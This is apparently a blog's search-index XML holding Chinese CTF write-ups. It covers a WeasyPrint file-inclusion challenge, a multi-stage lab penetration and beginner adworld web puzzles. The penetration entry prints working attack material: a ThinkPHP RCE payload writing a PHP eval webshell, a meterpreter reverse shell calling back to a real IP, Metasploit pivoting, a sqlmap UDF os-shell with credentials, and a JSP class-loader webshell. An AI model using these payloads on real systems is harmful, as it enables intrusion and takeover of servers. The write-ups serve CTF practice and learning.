<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>NSSCTF-Round#20-Basic-WEB</title>
    <link href="/posts/a932742f/"/>
    <url>/posts/a932742f/</url>
    
    <content type="html"><![CDATA[<h1 id="真亦假，假亦真"><a href="#真亦假，假亦真" class="headerlink" title="真亦假，假亦真"></a>真亦假，假亦真</h1><p>签到</p><p>扫目录，访问 <code>/flag</code> 即可</p><h1 id="CSDN-To-PDF-V1-2"><a href="#CSDN-To-PDF-V1-2" class="headerlink" title="CSDN_To_PDF V1.2"></a>CSDN_To_PDF V1.2</h1><p>url 转 pdf</p><p>尝试之后，发现 url 必须包含 <code>blog.csdn.net</code> 、 <code>https://</code> 或 <code>http://</code>，同时过滤了 <code>html</code></p><p>遂构造 <code>http://host:port/hack?blog.csdn.net</code></p><p>vps 上监听端口，访问得</p><p><img src="/posts/a932742f/image-20240330175430314.png" alt="image-20240330175430314"></p><p>可以看到是 <code>WeasyPrint</code> ，存在 <strong>文件包含</strong> 漏洞</p><p>本地建个 <code>hack</code> 文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;attachment&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>放在 vps 上，启动即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m http.server 9999<br></code></pre></td></tr></table></figure><p>输入<code>http://host:port/hack?blog.csdn.net</code> ，得到文件</p><p>使用 <code>pdfdetach</code> 分析即可得到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">pdfdetach -list xx.pdf<br>pefdetach -save 1 xx.pdf<br></code></pre></td></tr></table></figure><p><img src="/posts/a932742f/image-20240330180443524.png" alt="image-20240330180443524"><img src="/posts/a932742f/image-20240330180527711.png" alt="image-20240330180527711"></p><p>得到<img src="/posts/a932742f/image-20240330180657222.png" alt="image-20240330180657222"></p><p>flag 藏在 <code>/proc/self/environ</code> 里</p><p><img src="/posts/a932742f/image-20240330180901336.png" alt="image-20240330180901336"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>My-First-Penetration</title>
    <link href="/posts/c220aa1/"/>
    <url>/posts/c220aa1/</url>
    
    <content type="html"><![CDATA[<h1 id="Tim大人的Web渗透-WriteUps"><a href="#Tim大人的Web渗透-WriteUps" class="headerlink" title="Tim大人的Web渗透 WriteUps"></a>Tim大人的Web渗透 WriteUps</h1><p><img src="/posts/c220aa1/3.png" alt="3"></p><h2 id="门户网站"><a href="#门户网站" class="headerlink" title="门户网站"></a>门户网站</h2><p>访问，发现 Nothing</p><p><img src="/posts/c220aa1/image-20240325173023861.png" alt="image-20240325173023861"></p><p>尝试扫目录得</p><p><img src="/posts/c220aa1/image-20240325173728722.png" alt="image-20240325173728722"></p><p>访问得到新目录</p><p><img src="/posts/c220aa1/image-20240325173750029.png" alt="image-20240325173750029"></p><p>进入这个目录继续扫</p><p><img src="/posts/c220aa1/image-20240325174116781.png" alt="image-20240325174116781"></p><h3 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h3><p>可以使用 <a href="https://github.com/lijiejie/GitHack">GitHack</a> 直接下载</p><p><img src="/posts/c220aa1/image-20240325175850976.png" alt="image-20240325175850976"></p><p>可以发现是 <strong>脆弱的Thinkphp</strong>，查看拿到的源码，在<strong>CHANGELOG.md</strong>发现版本</p><p><img src="/posts/c220aa1/image-20240325215533982.png" alt="image-20240325215533982"></p><h3 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">/[working]dev_dir/public/th1nk.php?s=captcha<br><br>POST<br><br>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;&lt;?php @eval($_REQUEST[&#x27;shell&#x27;]);?&gt;&quot; &gt; shell.php<br></code></pre></td></tr></table></figure><p>hackbar 发包，但是蚁剑连接失败</p><p>尝试写入 txt 并查看 </p><p><img src="/posts/c220aa1/image-20240325222230164.png" alt="image-20240325222230164"></p><p><del>可以看到 <code>$_REQUEST</code> 被过滤，尝试绕过</del> echo 对单引号、双引号和反引号的输出不同</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-variable">$_REQUEST</span></span><br>echo &#x27;&lt;?php @eval($_REQUEST[&quot;shell&quot;]);?&gt;&#x27; &gt; shell.php<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">base64</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);?&gt;</span><br><br>echo &quot;PD9waHAgQGV2YWwoJF9SRVFVRVNUWydzaGVsbCddKTs/Pg==&quot; | base64 -d &gt; shell.php<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">$`_`_REQUEST</span><br><br>echo &quot;&lt;?php @eval($`_`_REQUEST[&#x27;shell&#x27;]);?&gt;&quot; &gt; shell.php<br></code></pre></td></tr></table></figure><p>成功连接</p><p><img src="/posts/c220aa1/image-20240325223141085.png" alt="image-20240325223141085"></p><p>访问根目录得到 </p><h4 id="f1ag"><a href="#f1ag" class="headerlink" title="f1ag"></a>f1ag</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs f1ag">CNSS&#123;y0u_sh0u1d_kn0w_th1nkphp_suck5&#125;<br></code></pre></td></tr></table></figure><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>生成后门，再利用蚁剑上传即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=111.229.23.244 LPORT=9999 -f elf &gt; shell.elf<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240325231947768.png" alt="image-20240325231947768"></p><p>vps 启动 msf ，监听上面的端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/multi/handler<br>set payload linux/x64/meterpreter/reverse_tcp<br>set lhost 0.0.0.0<br>set lport 9999<br>exploit<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326000610375.png" alt="image-20240326000610375"></p><p>打开蚁剑的终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 777 shell.elf<br>./shell.elf<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326000642097.png" alt="image-20240326000642097"></p><p>可以看到 msf 已经连上了</p><p><img src="/posts/c220aa1/image-20240326000755040.png" alt="image-20240326000755040"></p><h2 id="门户网站数据库服务器"><a href="#门户网站数据库服务器" class="headerlink" title="门户网站数据库服务器"></a>门户网站数据库服务器</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>从上面下载的源码可以得到数据库的相关参数</p><p><img src="/posts/c220aa1/image-20240325224113132.png" alt="image-20240325224113132"></p><p>看一下内网信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">run get_local_subnets<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326000927232.png" alt="image-20240326000927232"></p><blockquote><p>MSF的跳板功能，是MSF框架中自带的一个路由转发功能，其实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往“内网”的路由，直接使用msf去访问原本不能直接访问的内网资源，只要路由可达了那么我们使用msf的强大功能，为所欲为了。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">run autoroute -s 10.88.12.0/24 # 添加路由<br>run autoroute -p # 查看存在路由<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326001845321.png" alt="image-20240326001845321"></p><p>但是以上路由仅在当前 msf 会话可访问，所以为了方便我们外部访问，开启代理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">background # 把 sessions 放到后台 $ sessions id 可以切回来<br>use auxiliary/server/socks_proxy<br>set srvhost 0.0.0.0<br>set srvport 23333<br>exploit <br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326002553591.png" alt="image-20240326002553591"></p><p>配置好 <code>proxychains</code> 即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo vim /etc/proxychains4.conf <br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326003308594.png" alt="image-20240326003308594"></p><p>Windows 用的是 <code>SocksCap</code></p><p><img src="/posts/c220aa1/image-20240326003714275.png" alt="image-20240326003714275"></p><h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack!!"></a>Attack!!</h3><p>上面已经拿到了数据库的信息</p><p>直接启动 sqlmap 进行 <strong>UDF提权</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">proxychains4 sqlmap -d mysql://cnss:2dbdffb833bd44418825ef5d4f12183b@10.88.12.34:3306/mysql --os-shell<br></code></pre></td></tr></table></figure><p>貌似选哪个都行</p><p><img src="/posts/c220aa1/image-20240326005235534.png" alt="image-20240326005235534"></p><p>根目录得到flag</p><p><img src="/posts/c220aa1/image-20240326005301898.png" alt="image-20240326005301898"></p><h4 id="f2ag"><a href="#f2ag" class="headerlink" title="f2ag"></a>f2ag</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs f2ag">CNSS&#123;w1th_Us3r_D3f1n3d_Funct10n_w3_c4n_get_sySt3m_5he11!&#125;<br></code></pre></td></tr></table></figure><h3 id="数据库信息"><a href="#数据库信息" class="headerlink" title="数据库信息"></a>数据库信息</h3><p>直接使用 kali 自带 mysql 连接数据库，并输入密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">proxychains4 mysql -h 10.88.12.34 -P 3306 -u cnss -p<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326010159233.png" alt="image-20240326010159233"></p><p>查询可得 ip 与用户信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show databases;<br>use cnss;<br>show tables;<br>select * from tomcat_info;<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326010418552.png" alt="image-20240326010418552"></p><h2 id="tim在526的服务器"><a href="#tim在526的服务器" class="headerlink" title="tim在526的服务器"></a>tim在526的服务器</h2><p>猜测端口8080</p><p><img src="/posts/c220aa1/image-20240326011204278.png" alt="image-20240326011204278"></p><p>访问得（Edge打不开，奇怪捏</p><p><img src="/posts/c220aa1/image-20240326011242195.png" alt="image-20240326011242195"></p><h3 id="CVE-2020-1938-AJP-文件包含漏洞"><a href="#CVE-2020-1938-AJP-文件包含漏洞" class="headerlink" title="CVE-2020-1938 AJP 文件包含漏洞"></a>CVE-2020-1938 AJP 文件包含漏洞</h3><p>需要登录，前面拿到的 md5 密码可以在 <a href="https://hashes.com/zh/decrypt/hash">MD5 在線免費解密 MD5、SHA1、MySQL、NTLM、SHA256、SHA512、Wordpress、Bcrypt 的雜湊 (hashes.com)</a> 爆出</p><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pass">32cc5886dc1fa8c106a02056292c4654:g00dPa$$w0rD<br></code></pre></td></tr></table></figure><p>点击 <code>ManagerApp</code> 登录即可</p><p>此处存在文件上传漏洞</p><p><img src="/posts/c220aa1/image-20240326014441344.png" alt="image-20240326014441344"></p><p>制作 war 包上传即可</p><ul><li><p>jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>        U(ClassLoader c) &#123;<br>            <span class="hljs-built_in">super</span>(c);<br>        &#125;<br>        <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] base64Decode(String str) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) clazz.getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke(<span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;passwd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cls != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">jar cvf hack.war  hack.jsp<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326131514119.png" alt="image-20240326131514119"></p><p>蚁剑左上角设置代理并连接</p><p><img src="/posts/c220aa1/image-20240326132019796.png" alt="image-20240326132019796"></p><p>根目录获得flag</p><h4 id="f2ag-1"><a href="#f2ag-1" class="headerlink" title="f2ag"></a>f2ag</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs flag">CNSS&#123;S0rRy_My_P4s5w0rD_L3ak3d_QwQ&#125;<br></code></pre></td></tr></table></figure><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>生成后门</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=7777 -f elf &gt; shell2.elf<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326222611734.png" alt="image-20240326222611734"></p><p>进入 <code>/usr/local/tomcat/webapps</code> 进行上传</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">background<br>use exploit/multi/handler <br>set payload linux/x64/meterpreter/bind_tcp<br>set rhost 10.88.12.173<br>set lport 7777<br>exploit<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326222706883.png" alt="image-20240326222706883"></p><p>打开蚁剑终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 777 shell2.elf<br>./shell2.elf<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326222950342.png" alt="image-20240326222950342"></p><p>返回 msf，可以看到已经连接上了</p><p><img src="/posts/c220aa1/image-20240326223022356.png" alt="image-20240326223022356"></p><h2 id="526-机密服务器"><a href="#526-机密服务器" class="headerlink" title="526 机密服务器"></a>526 机密服务器</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>获得网络信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">run get_local_subnets <br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326223701648.png" alt="image-20240326223701648"></p><p>添加新的路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">run autoroute -s 172.52.1.0/24<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326223753147.png" alt="image-20240326223753147"></p><p>从上面拿到的 shell 里，查看常用目录</p><p>在 <code>/home/cnss</code> 里拿到 ssh 的 <strong>私钥</strong> 和 <code>.bash_history</code></p><p>登录得 flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">proxychains4 ssh -i Desktop/id_cnss cnss@172.52.1.231<br></code></pre></td></tr></table></figure><p><img src="/posts/c220aa1/image-20240326224034563.png" alt="image-20240326224034563"></p><p><img src="/posts/c220aa1/image-20240326224244646.png" alt="image-20240326224244646"></p><h4 id="f3ag"><a href="#f3ag" class="headerlink" title="f3ag"></a>f3ag</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs flag">CNSS&#123;H0w_d1d_y0u_g3t_h3r3!&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>adworld</title>
    <link href="/posts/df9d333d/"/>
    <url>/posts/df9d333d/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><blockquote><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。</p></blockquote><p><img src="/posts/df9d333d/image-20240321174903818.png" alt="image-20240321174903818"></p><p>点击<strong>开发人员工具</strong>即可</p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><blockquote><p>X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p></blockquote><p>如题，访问 <code>/robots.txt</code> 即可</p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><blockquote><p>X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</p></blockquote><p><img src="/posts/df9d333d/image-20240322172004145.png" alt="image-20240322172004145"></p><p>猜测 <code>index.php.bak</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;备份文件&lt;/title&gt;<br>    &lt;link href=<span class="hljs-string">&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;<br>    &lt;style&gt;<br>        body&#123;<br>            margin-left:auto;<br>            margin-right:auto;<br>            margin-TOP:200PX;<br>            width:20em;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h3&gt;你知道index.php的备份文件名吗？&lt;/h3&gt;<br>&lt;?php<br>$flag=<span class="hljs-string">&quot;Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;&quot;</span><br>?&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><blockquote><p>X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’</p></blockquote><p>F12 查看 cookie</p><p><img src="/posts/df9d333d/image-20240322172120878.png" alt="image-20240322172120878"></p><p><img src="/posts/df9d333d/image-20240322172152637.png" alt="image-20240322172152637"></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><blockquote><p>X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p></blockquote><p><img src="/posts/df9d333d/image-20240322172330655.png" alt="image-20240322172330655"></p><p>F12 删掉 disabled 再点击即可</p><p><img src="/posts/df9d333d/image-20240322172413327.png" alt="image-20240322172413327"></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><blockquote><p>X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</p></blockquote><p><code>curl -X POST http://61.147.171.105:53979/?a=1 -d &quot;b=2&quot;</code></p><p><img src="/posts/df9d333d/image-20240322172558929.png" alt="image-20240322172558929"></p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><blockquote><p>小宁写了一个登陆验证页面，随手就设了一个密码。</p></blockquote><p>弱密码</p><p><img src="/posts/df9d333d/image-20240322172651557.png" alt="image-20240322172651557"></p><p>弱密码猜测 admin&#x2F;123456</p><p><img src="/posts/df9d333d/image-20240322172716643.png" alt="image-20240322172716643"></p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><blockquote><p>小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p></blockquote><p>PHP 弱类型</p><p><img src="/posts/df9d333d/image-20240322172844038.png" alt="image-20240322172844038"></p><p>在PHP中，当使用双等号（&#x3D;&#x3D;）进行比较时，如果比较的两个值类型不同，PHP会尝试将它们转换为相同的类型然后再进行比较。在这种情况下，字符串和整数进行比较时，字符串会被尝试转换为数字。</p><p>在PHP中，如果字符串不是以有效的数值开头，它会被转换为0。</p><p>故传入 <code>a=a</code></p><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后，因为查看函数发现该函数对于第一个空格字符会跳过空格字符直接判断后面的内容</p><p><strong>构造：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">?b = <span class="hljs-number">1235</span>%<span class="hljs-number">00</span><br>?b = <span class="hljs-number">1235</span>%<span class="hljs-number">20</span><br>?b = <span class="hljs-number">1235</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?b = 1235a</span><br></code></pre></td></tr></table></figure><p>得<img src="/posts/df9d333d/image-20240322173700567.png" alt="image-20240322173700567"></p><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><blockquote><p>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p></blockquote><ul><li>管道符号截断命令执行</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">&amp; 表示任务后台执行</span><br><span class="hljs-string">| 上一条命令的输出，作为下一条命令参数(输入)</span><br><span class="hljs-meta">&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令</span><br><span class="hljs-string">|| 表示上一条命令执行失败后，才执行下一条命令</span><br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322174223866.png" alt="image-20240322174223866"></p><p>根目录和当前目录都无，于是 find 命令从 <code>/</code> 寻找 flag 文件</p><p><img src="/posts/df9d333d/image-20240322174144114.png" alt="image-20240322174144114"></p><h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>根据提示访问 <code>/robots.txt</code> </p><p><img src="/posts/df9d333d/image-20240322174755142.png" alt="image-20240322174755142"></p><p>继续访问即可</p><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><blockquote><p>X老师告诉小宁其实xff和referer是可以伪造的。</p></blockquote><ul><li>header 伪造</li></ul><p><img src="/posts/df9d333d/image-20240322174839095.png" alt="image-20240322174839095"></p><p>根据提示，追加 <code>X-Forwarded-For</code></p><p><img src="/posts/df9d333d/image-20240322174948752.png" alt="image-20240322174948752"></p><p>得到<img src="/posts/df9d333d/image-20240322175002381.png" alt="image-20240322175002381"></p><p>追加 <code>Referer</code></p><p><img src="/posts/df9d333d/image-20240322175049210.png" alt="image-20240322175049210"></p><p>得到<img src="/posts/df9d333d/image-20240322175106777.png" alt="image-20240322175106777"></p><h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h2><blockquote><p>想想初始页面是哪个</p></blockquote><p>根据提示访问 <code>index.php</code></p><p><img src="/posts/df9d333d/image-20240322175320221.png" alt="image-20240322175320221"></p><p>发现 <strong>302跳转</strong> 于是使用 curl</p><p><img src="/posts/df9d333d/image-20240322175406158.png" alt="image-20240322175406158"></p><p>猜测在响应标头，使用 <code>-i</code> 显示</p><p><img src="/posts/df9d333d/image-20240322175533400.png" 